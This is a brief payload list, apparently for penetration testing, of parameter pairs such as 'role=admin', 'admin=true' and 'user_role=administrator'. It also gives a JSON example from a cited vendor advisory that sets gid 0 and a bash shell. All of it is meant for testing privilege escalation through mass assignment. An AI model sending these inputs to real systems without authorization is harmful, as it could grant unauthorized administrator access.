# MassAssignment
These are parameter name value pairs to attempt privilege escalation via mass assignment
role=admin
role=0
..
role=9

admin=true

admin=1

user_role=0

user_role=9

user_role=admin

user_role=administrator

user_role=moderator

user_role=

administrator=true


If JSON is used these are extra params that have been found in vulnerability reports:
"shell":"/bin/bash"

Exampe from https://www.silver-peak.com/sites/default/files/advisory/silver_peak_security_advisory_mass_assignment_vulnerability.pdf
{"users":{"basic":{"self":"basic","enable":true,"gid":0,"password":"[SNIP]","
shell":"/bin/bash"}},[SNIP
other users]}}

